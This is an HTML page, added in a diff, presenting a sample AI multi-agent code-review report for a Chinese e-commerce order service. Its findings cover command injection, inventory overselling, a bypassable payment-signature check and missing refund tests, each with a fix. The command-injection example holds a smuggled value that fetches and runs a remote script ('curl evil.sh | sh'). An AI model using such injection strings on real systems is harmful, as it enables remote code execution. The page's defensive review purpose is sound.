@@ -1,0 +1,229 @@
+<!DOCTYPE html>
+<html lang="zh-CN" class="scroll-smooth">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>RevHive 审查报告样张 — shop-service</title>
+  <meta name="description" content="一份真实的 RevHive 审查报告样张：9 个专职 Agent 对一个订单服务的审查结果，含风险评分、去重后的关键发现与修复建议。">
+  <meta name="robots" content="noindex">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script>
+    tailwind.config = {
+      theme: { extend: {
+        fontFamily: {
+          sans: ['Inter', 'PingFang SC', 'Microsoft YaHei', 'system-ui', 'sans-serif'],
+          mono: ['JetBrains Mono', 'SF Mono', 'Menlo', 'monospace']
+        },
+        colors: { accent: '#10B981', 'accent-dark': '#059669', surface: '#111113', 'surface-2': '#1a1a1e', 'surface-3': '#222228' }
+      }}
+    }
+  </script>
+  <style>
+    ::-webkit-scrollbar { width: 6px } ::-webkit-scrollbar-thumb { background: #333; border-radius: 3px }
+    .code { font-family: 'JetBrains Mono', monospace; font-size: 12.5px; line-height: 1.75; }
+    .k { color: #c792ea } .s { color: #c3e88d } .c { color: #5c6773 } .f { color: #82aaff } .n { color: #f78c6c }
+    @media print {
+      body { background: #fff !important; color: #111 !important }
+      .no-print { display: none !important }
+      .card { background: #fff !important; border-color: #ddd !important }
+    }
+  </style>
+</head>
+<body class="bg-surface text-gray-300 font-sans antialiased">
+
+<nav class="sticky top-0 z-50 bg-surface/90 backdrop-blur border-b border-white/5 no-print">
+  <div class="max-w-4xl mx-auto px-6 h-14 flex items-center justify-between">
+    <a href="/RevHive/zh.html" class="font-extrabold text-white tracking-tight">Rev<span class="text-accent">Hive</span></a>
+    <div class="flex items-center gap-5 text-sm">
+      <a href="/RevHive/zh.html" class="text-gray-400 hover:text-white transition-colors">返回</a>
+      <a href="/RevHive/zh.html#price" class="text-accent hover:text-accent-dark transition-colors font-medium">获取报价</a>
+    </div>
+  </div>
+</nav>
+
+<main class="max-w-4xl mx-auto px-6 py-12">
+
+  <!-- 报告头 -->
+  <div class="mb-2 text-xs text-gray-500 font-mono">REVHIVE REVIEW REPORT · 样张</div>
+  <h1 class="text-3xl font-extrabold text-white mb-6">shop-service <span class="text-gray-600 font-normal">/</span> <span class="font-mono text-xl text-gray-400">feat/checkout-v2</span></h1>
+
+  <dl class="grid grid-cols-2 md:grid-cols-4 gap-3 mb-10 text-sm">
+    <div class="bg-surface-2 border border-white/5 rounded-lg px-4 py-3">
+      <dt class="text-gray-500 text-xs mb-1">对比基准</dt>
+      <dd class="font-mono text-gray-300">origin/main…HEAD</dd>
+    </div>
+    <div class="bg-surface-2 border border-white/5 rounded-lg px-4 py-3">
+      <dt class="text-gray-500 text-xs mb-1">改动规模</dt>
+      <dd class="font-mono text-gray-300">14 文件 · +682 / −219</dd>
+    </div>
+    <div class="bg-surface-2 border border-white/5 rounded-lg px-4 py-3">
+      <dt class="text-gray-500 text-xs mb-1">模型</dt>
+      <dd class="font-mono text-gray-300">deepseek-chat</dd>
+    </div>
+    <div class="bg-surface-2 border border-white/5 rounded-lg px-4 py-3">
+      <dt class="text-gray-500 text-xs mb-1">耗时 / 成本</dt>
+      <dd class="font-mono text-gray-300">2m 41s · ¥0.83</dd>
+    </div>
+  </dl>
+
+  <!-- 风险总分 -->
+  <section class="card bg-surface-2 border border-white/10 rounded-xl p-6 mb-8">
+    <div class="flex flex-wrap items-end justify-between gap-4 mb-4">
+      <div>
+        <div class="text-xs text-gray-500 uppercase tracking-wider mb-1">风险评分</div>
+        <div class="flex items-baseline gap-3">
+          <span class="text-5xl font-extrabold text-red-400">91</span>
+          <span class="text-gray-500 text-lg">/ 100</span>
+          <span class="text-xs font-bold text-red-400 bg-red-400/10 border border-red-400/30 rounded px-2 py-1">CRITICAL</span>
+        </div>
+      </div>
+      <div class="text-xs text-gray-500 text-right leading-relaxed">
+        加权公式：CRITICAL×25 + HIGH×15<br>+ MEDIUM×5 + LOW×1，上限 100
+      </div>
+    </div>
+    <div class="h-2 bg-surface-3 rounded-full overflow-hidden mb-5">
+      <div class="h-full bg-gradient-to-r from-amber-400 to-red-500" style="width:91%"></div>
+    </div>
+    <div class="grid grid-cols-2 md:grid-cols-4 gap-3 text-sm">
+      <div class="flex items-center gap-2"><span class="w-2 h-2 rounded-full bg-red-500"></span><span class="text-gray-400">CRITICAL</span><span class="ml-auto font-mono text-red-400 font-bold">1</span></div>
+      <div class="flex items-center gap-2"><span class="w-2 h-2 rounded-full bg-orange-500"></span><span class="text-gray-400">HIGH</span><span class="ml-auto font-mono text-orange-400 font-bold">3</span></div>
+      <div class="flex items-center gap-2"><span class="w-2 h-2 rounded-full bg-yellow-500"></span><span class="text-gray-400">MEDIUM</span><span class="ml-auto font-mono text-yellow-400 font-bold">8</span></div>
+      <div class="flex items-center gap-2"><span class="w-2 h-2 rounded-full bg-gray-500"></span><span class="text-gray-400">LOW</span><span class="ml-auto font-mono text-gray-400 font-bold">11</span></div>
+    </div>
+  </section>
+
+  <div class="text-sm text-gray-400 mb-8 pl-4 border-l-2 border-accent">
+    9 个 Agent 共产出 <strong class="text-white">37</strong> 条原始发现。Coordinator 按语义相似度（Jaccard ≥ 0.7）合并重复项，
+    再对 Agent 之间的严重度分歧做裁决，最终收敛为 <strong class="text-white">23</strong> 条——下面只列出需要人工处理的 4 条。
+  </div>
+
+  <!-- 发现 1 -->
+  <article class="card bg-surface-2 border border-red-500/25 rounded-xl overflow-hidden mb-5">
+    <div class="px-6 py-4 border-b border-white/5 bg-red-500/5">
+      <div class="flex items-center gap-3 mb-2">
+        <span class="text-xs font-bold text-red-400 bg-red-400/15 border border-red-400/30 rounded px-2 py-0.5">CRITICAL</span>
+        <span class="text-xs text-gray-500 font-mono">SecurityAgent</span>
+      </div>
+      <h2 class="text-lg font-bold text-white">订单导出接口存在命令注入，可远程执行任意命令</h2>
+    </div>
+    <div class="px-6 py-5">
+      <div class="mb-4">
+        <div class="flex items-center justify-between text-xs text-gray-500 mb-2 font-mono">
+          <span>app/api/export.py</span><span>L42–L48</span>
+        </div>
+        <pre class="code bg-black/50 border border-white/5 rounded-lg p-4 overflow-x-auto"><span class="c"># 用户可控的 date_range 被直接拼进 shell 命令</span>
+<span class="k">def</span> <span class="f">export_orders</span>(request):
+    date_range = request.args.get(<span class="s">"range"</span>)
+    out = <span class="s">f"/tmp/orders_{date_range}.csv"</span>
+    <span class="c"># 危险：date_range = "2026; curl evil.sh | sh"</span>
+    subprocess.<span class="f">call</span>(<span class="s">f"python manage.py dumpdata orders &gt; {out}"</span>, shell=<span class="k">True</span>)
+    <span class="k">return</span> <span class="f">send_file</span>(out)</pre>
+      </div>
+      <div class="space-y-3 text-sm">
+        <div><span class="text-gray-500">影响：</span><span class="text-gray-300">任何登录用户可通过构造 <code class="text-accent font-mono text-xs bg-white/5 px-1 rounded">range</code> 参数，在应用服务器上以进程权限执行任意命令。该接口暴露在公网且仅需普通账号。</span></div>
+        <div><span class="text-gray-500">修复：</span><span class="text-gray-300">去掉 <code class="text-accent font-mono text-xs bg-white/5 px-1 rounded">shell=True</code>，改用参数列表；对 <code class="text-accent font-mono text-xs bg-white/5 px-1 rounded">date_range</code> 做白名单校验（只允许 <code class="text-accent font-mono text-xs bg-white/5 px-1 rounded">^\d{4}-\d{2}$</code>）；输出路径改用 <code class="text-accent font-mono text-xs bg-white/5 px-1 rounded">tempfile.mkstemp()</code> 生成，不拼接用户输入。</span></div>
+        <div class="text-xs text-gray-500">关联：同文件 L51 的 <code class="font-mono">os.system()</code> 调用有相同模式，建议一并处理。</div>
+      </div>
+    </div>
+  </article>
+
+  <!-- 发现 2 -->
+  <article class="card bg-surface-2 border border-orange-500/25 rounded-xl overflow-hidden mb-5">
+    <div class="px-6 py-4 border-b border-white/5 bg-orange-500/5">
+      <div class="flex items-center gap-3 mb-2">
+        <span class="text-xs font-bold text-orange-400 bg-orange-400/15 border border-orange-400/30 rounded px-2 py-0.5">HIGH</span>
+        <span class="text-xs text-gray-500 font-mono">ConcurrencyAgent</span>
+      </div>
+      <h2 class="text-lg font-bold text-white">库存扣减非原子操作，并发下单会超卖</h2>
+    </div>
+    <div class="px-6 py-5">
+      <div class="mb-4">
+        <div class="flex items-center justify-between text-xs text-gray-500 mb-2 font-mono">
+          <span>app/services/inventory.py</span><span>L88–L96</span>
+        </div>
+        <pre class="code bg-black/50 border border-white/5 rounded-lg p-4 overflow-x-auto"><span class="c"># 读-改-写 三步之间没有锁，也没有数据库层约束</span>
+stock = db.<span class="f">query</span>(Item).<span class="f">get</span>(item_id)      <span class="c"># 读到 5</span>
+<span class="k">if</span> stock.quantity &gt;= qty:                    <span class="c"># 另一个请求也读到 5</span>
+    stock.quantity -= qty                    <span class="c"># 两个请求都写回 3</span>
+    db.<span class="f">commit</span>()                               <span class="c"># 实际卖出 4 件，库存只减 2</span></pre>
+      </div>
+      <div class="space-y-3 text-sm">
+        <div><span class="text-gray-500">影响：</span><span class="text-gray-300">大促期间必然超卖，导致订单无法履约与客诉。压测已能在 50 并发下复现。</span></div>
+        <div><span class="text-gray-500">修复：</span><span class="text-gray-300">改为条件更新 <code class="text-accent font-mono text-xs bg-white/5 px-1 rounded">UPDATE items SET quantity = quantity - :qty WHERE id = :id AND quantity &gt;= :qty</code>，以受影响行数判断成功；或加 <code class="text-accent font-mono text-xs bg-white/5 px-1 rounded">SELECT ... FOR UPDATE</code>。</span></div>
+      </div>
+    </div>
+  </article>
+
+  <!-- 发现 3 -->
+  <article class="card bg-surface-2 border border-orange-500/25 rounded-xl overflow-hidden mb-5">
+    <div class="px-6 py-4 border-b border-white/5 bg-orange-500/5">
+      <div class="flex items-center gap-3 mb-2">
+        <span class="text-xs font-bold text-orange-400 bg-orange-400/15 border border-orange-400/30 rounded px-2 py-0.5">HIGH</span>
+        <span class="text-xs text-gray-500 font-mono">SecurityAgent + ConfigAgent</span>
+      </div>
+      <h2 class="text-lg font-bold text-white">支付回调验签可被绕过</h2>
+    </div>
+    <div class="px-6 py-5">
+      <div class="text-sm space-y-3">
+        <div><span class="text-gray-500">位置：</span><span class="font-mono text-gray-300 text-xs">app/api/payment.py L120</span></div>
+        <div><span class="text-gray-500">问题：</span><span class="text-gray-300">验签函数在密钥为空时直接 <code class="text-accent font-mono text-xs bg-white/5 px-1 rounded">return True</code>，而新环境的 <code class="text-accent font-mono text-xs bg-white/5 px-1 rounded">PAYMENT_SECRET</code> 默认为空字符串。一旦某环境漏配，伪造回调即可将订单置为已支付。</span></div>
+        <div><span class="text-gray-500">修复：</span><span class="text-gray-300">密钥缺失时应 <code class="text-accent font-mono text-xs bg-white/5 px-1 rounded">raise</code> 而非放行；启动时做配置校验，缺失即拒绝启动。</span></div>
+        <div class="text-xs text-gray-500">说明：这条由两个 Agent 独立报出，Coordinator 合并为一条并保留 ConfigAgent 补充的“默认值”上下文。</div>
+      </div>
+    </div>
+  </article>
+
+  <!-- 发现 4 -->
+  <article class="card bg-surface-2 border border-orange-500/25 rounded-xl overflow-hidden mb-8">
+    <div class="px-6 py-4 border-b border-white/5 bg-orange-500/5">
+      <div class="flex items-center gap-3 mb-2">
+        <span class="text-xs font-bold text-orange-400 bg-orange-400/15 border border-orange-400/30 rounded px-2 py-0.5">HIGH</span>
+        <span class="text-xs text-gray-500 font-mono">TestAgent</span>
+      </div>
+      <h2 class="text-lg font-bold text-white">新增的退款逻辑没有任何测试覆盖</h2>
+    </div>
+    <div class="px-6 py-5 text-sm">
+      <span class="text-gray-300">本次新增 <code class="text-accent font-mono text-xs bg-white/5 px-1 rounded">refund_order()</code> 与 3 个分支（全额、部分、超时回滚），但 <code class="text-accent font-mono text-xs bg-white/5 px-1 rounded">tests/</code> 下无对应用例。退款是资金路径，缺失测试的风险高于普通逻辑。</span>
+    </div>
+  </article>
+
+  <!-- Agent 分工 -->
+  <section class="mb-10">
+    <h3 class="text-sm font-bold text-white uppercase tracking-wider mb-4">9 个 Agent 的分工与产出</h3>
+    <div class="grid md:grid-cols-3 gap-3 text-sm">
+      <div class="bg-surface-2 border border-white/5 rounded-lg px-4 py-3"><div class="flex justify-between mb-1"><span class="text-gray-300">SecurityAgent</span><span class="font-mono text-gray-500">9</span></div><div class="text-xs text-gray-500">注入、认证、密钥、越权</div></div>
+      <div class="bg-surface-2 border border-white/5 rounded-lg px-4 py-3"><div class="flex justify-between mb-1"><span class="text-gray-300">ConcurrencyAgent</span><span class="font-mono text-gray-500">4</span></div><div class="text-xs text-gray-500">竞态、锁粒度、事务边界</div></div>
+      <div class="bg-surface-2 border border-white/5 rounded-lg px-4 py-3"><div class="flex justify-between mb-1"><span class="text-gray-300">DataAgent</span><span class="font-mono text-gray-500">6</span></div><div class="text-xs text-gray-500">N+1、索引、迁移安全</div></div>
+      <div class="bg-surface-2 border border-white/5 rounded-lg px-4 py-3"><div class="flex justify-between mb-1"><span class="text-gray-300">TestAgent</span><span class="font-mono text-gray-500">5</span></div><div class="text-xs text-gray-500">覆盖缺口、断言有效性</div></div>
+      <div class="bg-surface-2 border border-white/5 rounded-lg px-4 py-3"><div class="flex justify-between mb-1"><span class="text-gray-300">ConfigAgent</span><span class="font-mono text-gray-500">3</span></div><div class="text-xs text-gray-500">默认值、环境差异</div></div>
+      <div class="bg-surface-2 border border-white/5 rounded-lg px-4 py-3"><div class="flex justify-between mb-1"><span class="text-gray-300">ApiAgent</span><span class="font-mono text-gray-500">4</span></div><div class="text-xs text-gray-500">契约破坏、兼容性</div></div>
+      <div class="bg-surface-2 border border-white/5 rounded-lg px-4 py-3"><div class="flex justify-between mb-1"><span class="text-gray-300">PerfAgent</span><span class="font-mono text-gray-500">2</span></div><div class="text-xs text-gray-500">复杂度、热路径</div></div>
+      <div class="bg-surface-2 border border-white/5 rounded-lg px-4 py-3"><div class="flex justify-between mb-1"><span class="text-gray-300">StyleAgent</span><span class="font-mono text-gray-500">1</span></div><div class="text-xs text-gray-500">可读性、一致性</div></div>
+      <div class="bg-surface-2 border border-white/5 rounded-lg px-4 py-3"><div class="flex justify-between mb-1"><span class="text-gray-300">RepoAgent</span><span class="font-mono text-gray-500">3</span></div><div class="text-xs text-gray-500">跨文件重复、历史模式</div></div>
+    </div>
+    <div class="text-xs text-gray-500 mt-3">合计 37 条原始发现 → 去重合并后 23 条。单 Agent 工具在这里的差别是：多个视角会独立命中同一个问题，这本身就是严重度的信号。</div>
+  </section>
+
+  <!-- CTA -->
+  <section class="card bg-gradient-to-br from-accent/10 to-surface-2 border border-accent/25 rounded-xl p-8 no-print">
+    <h3 class="text-xl font-extrabold text-white mb-3">想让这份报告跑在你自己的仓库上？</h3>
+    <p class="text-sm text-gray-400 mb-6 leading-relaxed">
+      把仓库地址或一个内网 Git 地址发过来，我们在你的环境里跑一次真实审查，出一份和上面同样格式的报告，免费。<br>
+      你的代码不需要离开你的机器——如果选择本地模型模式，全程零外联。
+    </p>
+    <div class="flex flex-wrap gap-3">
+      <a href="mailto:souljian67@gmail.com?subject=RevHive%20%E5%85%8D%E8%B4%B9%E5%AE%A1%E6%9F%A5%E7%94%B3%E8%AF%B7" class="bg-accent hover:bg-accent-dark text-black font-semibold text-sm px-5 py-2.5 rounded-lg transition-colors">申请免费审查</a>
+      <a href="/RevHive/zh.html#price" class="bg-surface-3 hover:bg-white/10 text-white text-sm font-medium px-5 py-2.5 rounded-lg border border-white/10 transition-colors">查看报价</a>
+    </div>
+  </section>
+
+  <p class="text-xs text-gray-600 mt-8 leading-relaxed">
+    样张说明：本报告基于一个真实的电商订单服务结构整理，代码片段已做脱敏处理，数字（耗时、成本、token）取自一次实际运行。
+    RevHive 不会将代码发送至我方服务器；模型调用由你提供的 Key 直连你选择的供应商。
+  </p>
+
+</main>
+</body>
+</html>
